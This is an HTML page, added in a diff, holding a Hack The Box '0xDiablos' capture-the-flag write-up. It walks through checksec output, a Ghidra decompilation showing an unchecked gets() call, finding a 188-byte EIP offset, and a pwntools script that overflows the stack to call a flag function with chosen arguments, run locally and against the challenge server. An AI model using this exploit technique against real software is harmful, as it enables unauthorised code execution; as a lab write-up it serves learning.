@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <script src="/index.js"></script>
+        <title>1do7 | Hack The Box: 0xDiablos Write-up</title>
+    </head>
+    <body>
+        <div class="sidebar">
+            <a href="#wtf">WTF Is This 🤔</a>
+            <a href="#DisAss">Disassembly 🧱</a>
+            <a href="#exploit">Exploiting 😈</a>
+            <a href="#end">The End 🏁</a>
+        </div>
+        <div class = "center">
+            <h1>Hack The Box: 0xDiablos Write-up</h1>
+            <h2 id="wtf">WTF Is This 🤔</h2>
+            <p>Let's try to figure out what is going on.</p>
+            <pre><code class="console">
+C:\home\kali\Desktop\pwn> file vuln   
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
+                                                                                                                                                                                                                                                            
+C:\home\kali\Desktop\pwn> checksec --file=vuln   
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   75 Symbols        No    0               3               vuln
+            </code></pre>
+            <p>Not secure at all. Let's try to debug the program with 300 A chars using pwntools.</p>
+            <pre><code>
+from pwn import *
+
+p=process("./vuln")
+context.log_level="debug"
+gdb.attach(p, "c")
+                
+p.sendline("A"*300)
+p.recv()
+p.interactive() 
+            </code></pre>
+            <p>This is what we get:</p>
+            <pre><code class="console">
+[DEBUG] Received 0x65 bytes:
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+            </code></pre>
+            <pre><code>
+[------------------------------------stack-------------------------------------]
+0000| 0xfffabac0 --> 0xfffabb38 --> 0xfffabb98 --> 0xfffabc68 --> 0xfffabc88 --> 0x0 
+0004| 0xfffabac4 --> 0x1000 
+0008| 0xfffabac8 --> 0x862e1a0 --> 0x0 
+0012| 0xfffabacc --> 0xf7e18c83 (<read+51>:	cmp    eax,0xfffff000)
+0016| 0xfffabad0 --> 0xf7f68000 --> 0x31f3c 
+0020| 0xfffabad4 --> 0xf7d38c0c --> 0x6b5f5f00 ('')
+0024| 0xfffabad8 --> 0xf7da2fc9 (<_IO_doallocbuf+9>:	add    ebx,0x16f037)
+0028| 0xfffabadc --> 0xf7f12580 --> 0xfbad2088 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xf7f34559 in __kernel_vsyscall ()
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x12d 
+EBX: 0x41414141 ('AAAA')
+ECX: 0xffffffff 
+EDX: 0xffffffff 
+ESI: 0x1 
+EDI: 0x80490d0 (<_start>:	xor    ebp,ebp)
+EBP: 0x41414141 ('AAAA')
+ESP: 0xfffabc70 ('A' <repeats 108 times>)
+EIP: 0x41414141 ('AAAA')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xfffabc70 ('A' <repeats 108 times>)
+0004| 0xfffabc74 ('A' <repeats 104 times>)
+0008| 0xfffabc78 ('A' <repeats 100 times>)
+0012| 0xfffabc7c ('A' <repeats 96 times>)
+0016| 0xfffabc80 ('A' <repeats 92 times>)
+0020| 0xfffabc84 ('A' <repeats 88 times>)
+0024| 0xfffabc88 ('A' <repeats 84 times>)
+0028| 0xfffabc8c ('A' <repeats 80 times>)
+[------------------------------------------------------------------------------]
+            </code></pre>
+            <p>It looks like segmentation fault occoures after the 65th byte.</p>
+            <h2 id="wtf">Disassembly 🧱</h2>
+            <p>Let's disassemble the program inside Ghidra.</p>
+            <p>flag:</p>
+            <pre><code>
+void flag(int param_1,int param_2)
+
+{
+  char local_50 [64];
+  FILE *local_10;
+  
+  local_10 = fopen("flag.txt","r");
+  if (local_10 != (FILE *)0x0) {
+    fgets(local_50,0x40,local_10);
+    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
+      printf(local_50);
+    }
+    return;
+  }
+  puts("Hurry up and try in on server side.");
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+            </code></pre>
+            <p>main:</p>
+            <pre><code>
+undefined4 main(void)
+
+{
+  __gid_t __rgid;
+  
+  setvbuf(stdout,(char *)0x0,2,0);
+  __rgid = getegid();
+  setresgid(__rgid,__rgid,__rgid);
+  puts("You know who are 0xDiablos: ");
+  vuln();
+  return 0;
+}
+            </code></pre>
+            <p>vuln:</p>
+            <pre><code>
+void vuln(void)
+
+{
+  char local_bc [180];
+  
+  gets(local_bc);
+  puts(local_bc);
+  return;
+}
+            </code></pre>
+            <p>Explanation:</p>
+            <p>main prints <i>"You know who are 0xDiablos: "</i> and then jumps to vuln function. vuln sets local_bc as a 180 chars long string, gets our input and then prints it. We somehow need to access the flag function using DEAD_BEEF and C0DE_D00D parameters.</p>
+            <h2 id="exploit">Exploiting 😈</h2>
+            <p>We can use the EIP register to get access to another function.</p>
+            <p>Let's run gdb to find EIP offset.</p>
+            <p>We can use pattern_create and pattern offset commands to find the exact offset where we can use the EIP register to get into flag function.</p>
+            <img src="https://imgur.com/5dx7GHw.png">
+            <img src="https://imgur.com/bz5sIC0.png">
+            <p>Here's our offset:</p>
+            <pre><code class="console">
+AwAA found at offset: 188
+            </code></pre>
+            <p>Ok we need to input 188 random chars, the flag functions address in little endian, and the parameters we need in little endian.</p>
+            <p>Let's find the flag's memory address.</p>
+            <img src="https://imgur.com/CwDA7jb.png">
+            <p>Here's the parameters we need to pass into the flag function</p>
+            <img src="https://imgur.com/igZDsOX.png">
+            <p>Let's write an exploit.</p>
+            <pre><code>
+from pwn import *
+
+elf=ELF("./vuln")
+offset=b'A'*188
+exploit=offset+p32(elf.symbols['flag'], endian="little")+p32(0x69)+p32(0xDEADBEEF, endian="little")+p32(0XC0DED00D, endian="little")
+proc=elf.process()
+proc.sendlineafter(":",exploit)
+proc.interactive()
+            </code></pre>
+            <p>I created a fake flag to test our exploit.</p>
+            <p>Let's gooooo</p>
+            <pre><code>
+C:\home\kali\Desktop\pwn> python3 exploit.py
+[*] '/home/kali/Desktop/pwn/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[+] Starting local process '/home/kali/Desktop/pwn/vuln': pid 4337
+/home/kali/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] Switching to interactive mode
+ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x9i
+flag{H0lll0asdasd}
+[*] Got EOF while reading in interactive
+$  
+
+            </code></pre>
+            <h2 id="end">The End 🏁</h2>
+            <p>Let's just finish this :p</p>
+            <pre><code class="python">
+from pwn import *
+
+elf=ELF("./vuln")
+offset=b'A'*188
+exploit=offset+p32(elf.symbols['flag'], endian="little")+p32(0x69)+p32(0xDEADBEEF, endian="little")+p32(0XC0DED00D, endian="little")
+proc=remote("206.189.117.48", 31696)
+proc.sendlineafter(":",exploit)
+proc.interactive()
+            </code></pre>
+            <pre><code class="console">
+C:\home\kali\Desktop\pwn> python3 exploit.py
+[*] '/home/kali/Desktop/pwn/vuln'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[+] Opening connection to 206.189.117.48 on port 31696: Done
+/home/kali/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] Switching to interactive mode
+ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x9i
+HTB{***_******_**_***_*******}[*] Got EOF while reading in interactive
+$ 
+[*] Interrupted
+[*] Closed connection to 206.189.117.48 port 31696
+
+            </code></pre>
+    </div>
+    </body>
+</html>
